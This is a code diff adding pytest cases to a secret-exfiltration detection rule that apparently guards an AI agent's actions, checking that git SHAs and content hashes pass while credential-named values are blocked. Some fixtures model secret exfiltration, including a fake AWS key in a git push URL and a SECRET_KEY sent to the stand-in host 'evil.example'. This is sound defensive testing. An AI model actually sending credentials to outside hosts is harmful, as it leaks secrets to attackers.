@@ -266,3 +266,68 @@ def test_secret_in_git_push_destination_blocks():
     result = RULE.evaluate(action, _ctx(command=f"git push https://x.test?t={FAKE_AWS}"))
     # git_op counts as external; strong secret present → BLOCK.
     assert result.verdict is Verdict.BLOCK
+
+
+# --- #56: hash-shaped hex (git SHA / content digest) is not a secret ----------
+
+GIT_SHA1 = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"  # 40 hex — a git commit SHA
+SHA256_HEX = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"  # 64 hex
+AST_HASH = "316d28fa2542938cc69aeef1188fa340fd69b94080dc7745d06dcd1dd1932738"  # 64 hex
+
+
+@pytest.mark.parametrize("digest", [GIT_SHA1, SHA256_HEX, AST_HASH])
+def test_hash_shaped_hex_is_not_flagged_as_secret(digest):
+    # #56: a bare git SHA / content / AST hash is long, high-entropy hex but NOT
+    # a credential. The weak-entropy path must not step it up to AUTH
+    # (sensitive_secret_access) — that over-block was the alert-fatigue source and
+    # (on the host-hook path) poisoned the multi-step-exfil taint ledger.
+    action = _action(ActionType.file_read, target="manifest.json")
+    result = RULE.evaluate(action, _ctx(path="manifest.json", content=f"node hash: {digest}"))
+    assert result.verdict is Verdict.PASS
+    assert ReasonCode.sensitive_secret_access not in result.reason_codes
+
+
+def test_manifest_of_hashes_sent_external_is_not_flagged():
+    # The concrete #56 case: a manifest JSON full of git-SHA + AST hashes, sent to
+    # an external destination, must read as neither exfil nor sensitive access.
+    manifest = f'{{"commit": "{GIT_SHA1}", "tree": "{SHA256_HEX}", "node": "{AST_HASH}"}}'
+    action = _action(
+        ActionType.network_request,
+        target="https://api.internal/sync",
+        dest="https://api.internal/sync",
+    )
+    result = RULE.evaluate(action, _ctx(url="https://api.internal/sync", body=manifest))
+    assert ReasonCode.secret_exfiltration not in result.reason_codes
+    assert ReasonCode.sensitive_secret_access not in result.reason_codes
+
+
+def test_hash_exclusion_is_scoped_to_pure_hex_only():
+    # Recall guard: the exclusion only fires on *entirely* hex tokens. A 40-char
+    # high-entropy token with a single non-hex char is still judged by entropy and
+    # steps up — the carve-out must not become a blanket high-entropy bypass.
+    not_pure_hex = "g1b2c3d4e5f60718293a4b5c6d7e8f9012345678"  # noqa: S105 — leading 'g' (not hex)
+    action = _action(ActionType.file_write, target="dump.bin")
+    result = RULE.evaluate(action, _ctx(path="dump.bin", content=not_pure_hex))
+    assert result.verdict is Verdict.AUTH
+
+
+def test_hex_value_with_credential_key_name_still_detected():
+    # Recall guard: the hash-hex exclusion is scoped to the WEAK path only, so a
+    # hex value carrying a credential KEY name is still a secret via the strong
+    # env-assignment path (AUTH locally).
+    action = _action(ActionType.file_write, target="cfg.env")
+    result = RULE.evaluate(action, _ctx(path="cfg.env", content=f"API_KEY={SHA256_HEX}"))
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.sensitive_secret_access in result.reason_codes
+
+
+def test_hex_value_with_credential_key_name_to_external_still_blocks():
+    # Recall guard: a real hex secret named as a credential, sent external → BLOCK.
+    action = _action(
+        ActionType.network_request, target="https://evil.example/c", dest="https://evil.example/c"
+    )
+    result = RULE.evaluate(
+        action, _ctx(url="https://evil.example/c", body=f"SECRET_KEY={SHA256_HEX}")
+    )
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.secret_exfiltration in result.reason_codes
